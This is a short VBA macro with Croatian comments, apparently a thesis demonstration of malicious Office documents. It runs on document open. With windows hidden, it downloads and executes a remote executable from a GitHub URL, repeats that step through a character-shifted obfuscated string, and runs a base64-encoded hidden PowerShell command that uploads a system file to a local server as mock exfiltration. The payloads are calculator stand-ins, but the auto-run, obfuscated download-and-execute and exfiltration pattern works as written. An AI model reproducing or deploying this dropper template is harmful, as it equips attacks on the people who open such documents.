Sub Document_Open()

'pokretanje lokalnog binarya za primjer korištenja LOLBINa
    Dim objShell As Object
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc"
    
'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
    Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output preuzeto.exe && start preuzeto.exe", vbHide

'obfuscirano preuzimanje i pokretanje remote datoteke
NdkF = "": For i = 1 To 146: NdkF = NdkF + Chr(Asc(Mid("hri%4h%hzwq%2Q%''myyux?44lnymzg3htr4fhu|nsyjwx4_f{wxsndWfi4wf|4rfns4hfqh3j}j''%22tzyuzy%tgkzxhnwfstduwjzjyt3j}j%++%xyfwy%tgkzxhnwfstduwjzjyt3j}j", i, 1)) - (5)): Next
Shell NdkF, vbHide

'upload calc.exe na localhost za primjer exfiltracije podataka
    Dim exfil As String
    exfil = exfil & "powershell.exe -nop -w hidden -e ""YwB1AHIAbAAuAGUAeABlACAALQBYACAAUABPAFMAVAAg"
    exfil = exfil & "AC0ARgAgACIAZgBpAGwAZQA9AEAAQwA6AFwAVwBpA"""
    exfil = exfil & "G4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAG"""
    exfil = exfil & "MAYQBsAGMALgBlAHgAZQAiACAAaAB0AHQAcAA6AC8"""
    exfil = exfil & "ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAA"""
    CreateObject("Wscript.Shell").Run exfil, 0

End Sub
